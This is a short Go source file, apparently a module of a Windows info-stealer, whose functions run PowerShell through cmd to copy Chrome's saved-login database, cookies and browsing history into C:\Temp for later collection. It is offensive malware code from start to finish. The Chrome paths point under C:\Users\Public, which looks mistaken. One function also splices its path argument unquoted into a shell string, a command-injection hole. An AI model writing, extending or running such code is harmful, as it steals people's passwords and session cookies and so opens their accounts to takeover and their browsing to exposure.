//go:build windows

package credential

import (
"os/exec"
)

func ExtractBrowserCredentials(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' '"+outputPath+"'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ExtractBrowserCookies() bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' 'C:\\Temp\\cookies.db'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ExtractBrowserHistory() bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History' 'C:\\Temp\\history.db'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ExtractAllBrowserData() bool {
ExtractBrowserCredentials("C:\\Temp\\login.db")
ExtractBrowserCookies()
ExtractBrowserHistory()
return true
}
